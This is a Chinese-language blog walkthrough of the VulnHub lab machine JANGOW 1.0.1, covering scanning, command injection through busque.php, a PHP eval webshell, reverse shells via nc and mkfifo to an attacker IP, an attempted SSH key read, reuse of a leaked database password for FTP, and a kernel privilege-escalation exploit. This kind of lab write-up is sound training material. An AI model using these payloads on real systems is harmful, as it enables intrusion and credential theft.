---
title: vulnhub 做题 JANGOW 1.0.1
tags: [penetration]
date: 2024-10-12 00:00:00
categories: [penetration]
excerpt: day1
---


## vulnhub 做题 JANGOW: 1.0.1


### 用vmware开机分配不到ip

开机时按e进入gnu grub的boot选项配置界面，把linux一行最后的 ro 改成 `rw single init=/bin/bash`, ctrl+x 保存重启。

ip addr 可以查看有哪些网卡，然后打开 /etc/network/interfaces 把 primary network interface 里边的网卡替换成已有的。（也不知道这个interfaces里写的网卡是哪里来的，可能是因为我用的vmware不是virtualbox？）

（还遇到了键盘按/结果出来的是;的问题，也不知道是咋回事😴）

`/etc/init.d/networking restart`, 然后重启虚拟机

虽然本来该显示ip的REDE:还是什么都没有， 但是 nmap 已经可以扫到这个主机了

> 注：ubuntu 17以后，已经没有/etc/network/interfaces，改用netplan，而配置这个netplan，需要修改/etc/netplan/*.yml，然后用netplan apply命令更新。但是由于这个命令会调用systemctl，在单用户下用不了，所以我能想到的方法就是在单用户模式下创建一个新用户，正常登陆进去再配置😶‍🌫️😶‍🌫️😶‍🌫️~~（虽然感觉很弱智，但我也没找到更好的方法）~~


```zsh
└─$ nmap -sn 192.168.169.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 03:50 EDT
Nmap scan report for 192.168.169.2
Host is up (0.00053s latency).
Nmap scan report for 192.168.169.128
Host is up (0.00035s latency).
Nmap scan report for 192.168.169.129
Host is up (0.0022s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.03 seconds
```

### 扫描

```zsh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-title: Index of /
```

看到了web和ftp端口

### 漏洞点

打开这个web，会告诉/site路径下有一个网站

![](/img/pene/1.png)

一顿乱点发现右上角这个Buscar会跳转到一个奇怪的路径，`http://192.168.169.129/site/busque.php?buscar=`，这种路径用kali的dirbuster还找不到。看到有的题解说用feroxbuster ~~（但是这东西要两个G）~~，而且我实际用了一下也没扫到这个busque.php😢，倒是扫到了wordpress路径，但是和这道题没关系😴

然后对这个php的参数传进去一个linux命令，比如ls、id、ps等等，发现能执行并回显 ~~（我也不知道为什么就想到了输个linux命令进去，可能这就是大佬的经验吧）~~

其实这种情况也可以试试文件包含漏洞，形如 `busque.php?buscar=../../../../../../etc/passwd`

知道了可以执行命令尝试用nc反弹shell，`which%20nc` 发现确实有nc

`nc -lvvp 6666`监听链接，`nc%20-e%20/bin/bash%20<attacker-ip>%206666`尝试反弹shell

但是监听不到任何链接😭，只能换个方法

寻找ssh私钥  `cat%20/home/jangow01/.ssh/id_rsa` , 也没有回显

只能到处找找有没有什么奇怪的文件了

通过cat可以看到busque.php内容是`?php system($_GET['buscar']); ?`，现在也没用了

通过`ls -alh`在`/var/www/html`下发现有一个.backups文件

```php
$servername = "localhost"; 
$database = "jangow01"; 
$username = "jangow01"; 
$password = "abygurl69"; // Create connection 
$conn = mysqli_connect($servername, $username, $password, $database); // Check connection 
if (!$conn) { die("Connection failed: " . mysqli_connect_error()); } echo "Connected successfully";
mysqli_close($conn); 
```

由于端口扫描没开ssh服务，并且开了ftp服务，看一下是不是这个登陆密码

```zsh
└─$ ftp 192.168.169.129                          
Connected to 192.168.169.129.
220 (vsFTPd 3.0.3)
Name (192.168.169.129:kali): jangow01
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14986|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Oct 31  2021 html
226 Directory send OK.
ftp> 
```

成功登录 

生成一个一句话木马 

`echo '<?php eval($_POST["cmd"]); ?>' > shell.php`

`echo%20%27%3C?php%20eval($_POST[%22cmd%22]);%20?%3E%27%20%3E%20shell.php`

> 但是我在尝试用ftp上传一个shell.php文件时，会报错：553 Could not create file. 应该是权限不够，但是下载是可以的
> 那这道题给ftp的用户名和密码是为了啥呢，后面也用不到了😶‍🌫️

用AntSword链接，地址是 `http://192.168.169.129/site/shell.php` (要带上site) 密码就是要post的参数名cmd

创建一个用来反弹shell的php，rev.php

然后写入`echo '<?php system("mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.169.128 443 >/tmp/f");?>' > rev.php`

> 我不知道为什么echo进去总是失败，最后用的AntSword的文件管理写进去的

这里选择443端口是因为其余端口有防火墙，而靶机大部分是不会禁80 443的

浏览器访问rev.php，成功拿到反弹shell

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443            
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.169.128] from (UNKNOWN) [192.168.169.129] 52324
/bin/sh: 0: can't access tty; job control turned off
$ ls
assets
busque.php
css
index.html
js
rev.php
shell.php
wordpress
$ 
```


### 提权

通过which命令知道/usr/bin/python3，然后用 pty 方式来升级shell
`/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'`

得到了一个正常的shell

然后uname -a查看系统版本，发现是4.4.0-31-generic ubuntu

用kali的searchsploit搜索提权代码，然后用ftp或者AntSword上传到靶机上

`/usr/share/exploitdb/exploits/linux/local/45010.c`

编译执行提权成功

![](/img/pene/2.png)